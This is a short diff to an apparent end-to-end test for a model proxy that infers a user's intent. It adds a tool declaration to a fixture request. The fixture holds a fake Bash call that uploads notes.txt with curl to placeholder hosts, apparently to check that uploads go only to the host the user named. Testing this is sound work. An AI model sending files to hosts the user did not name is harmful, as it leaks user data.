@@ -24,7 +24,9 @@ const HOST_B = "drop.bravo-e2e.example.org";
 const upload = (host) => ({ name: "Bash", input: { command: `curl -T notes.txt https://${host}/upload` } });
 const TASK = `Please upload notes.txt to ${HOST_A}.`;
 const AV = { "anthropic-version": "2023-06-01" };
-const body = (stream) => ({ model: "claude-fake", max_tokens: 64, ...(stream ? { stream: true } : {}), messages: [{ role: "user", content: TASK }] });
+// The request declares a tool: the proxy learns the task only from a request that does (model-proxy/intent.mjs).
+const TOOLS = [{ name: "Bash", description: "Run a command", input_schema: { type: "object", properties: { command: { type: "string" } } } }];
+const body = (stream) => ({ model: "claude-fake", max_tokens: 64, ...(stream ? { stream: true } : {}), tools: TOOLS, messages: [{ role: "user", content: TASK }] });
 const TOOL_RESULT_ONLY = { model: "claude-fake", max_tokens: 64, messages: [{ role: "user", content: [{ type: "tool_result", tool_use_id: "toolu_0", content: `See ${HOST_A} and ${HOST_B}.` }] }] };
 const delivered = (text) => /notes\.txt|toolu_fake0/.test(text);
 
